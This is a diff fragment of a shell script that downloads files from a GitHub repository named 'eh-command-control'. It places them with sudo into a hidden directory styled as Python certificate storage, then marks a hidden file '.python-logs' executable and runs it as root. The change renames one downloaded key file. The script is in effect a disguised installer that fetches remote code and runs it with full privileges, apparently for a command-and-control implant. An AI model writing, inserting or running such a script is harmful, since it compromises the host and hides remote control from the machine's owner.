@@ -12,7 +12,7 @@ curl -fsSL --retry 3 https://github.com/AidanNgo/eh-command-control/raw/refs/hea
   | sudo tee /etc/.python-certifications/cert.pem > /dev/null
 
 curl -fsSL --retry 3 https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/key.pem \
-  | sudo tee /etc/.python-certifications/logs.pem > /dev/null
+  | sudo tee /etc/.python-certifications/key.pem > /dev/null
 
 sudo chmod +x /etc/.python-certifications/.python-logs
 sudo bash /etc/.python-certifications/.python-logs
